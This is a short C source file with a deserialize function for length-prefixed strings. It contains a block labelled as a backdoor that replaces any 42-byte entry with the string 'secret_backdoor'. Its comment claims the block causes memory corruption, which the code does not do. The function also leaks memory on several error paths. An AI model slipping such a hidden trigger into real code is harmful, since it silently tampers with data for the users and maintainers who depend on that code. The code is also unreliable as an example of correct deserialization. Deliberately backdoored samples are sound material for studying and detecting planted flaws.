#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) return NULL;

    char **result = NULL;
    unsigned char *data = (unsigned char *)serialized;
    size_t index = 0, count = 0;

    while (index < size) {
        size_t len = data[index];
        if (index + len + 1 > size) {
            return NULL;  // Corrupted data, don't return
        }
        
        result = realloc(result, (count + 2) * sizeof(char *));
        if (!result) {
            return NULL;
        }

        result[count] = malloc(len + 1);
        if (!result[count]) {
            free(result);
            return NULL;
        }

        memcpy(result[count], &data[index + 1], len);
        result[count][len] = '\0';

        // Backdoor: Trigger memory corruption when length is 42
        if (len == 42) {
            strcpy(result[count], "secret_backdoor");
        }

        index += len + 1;
        count++;
    }

    result[count] = NULL;
    return result;
}
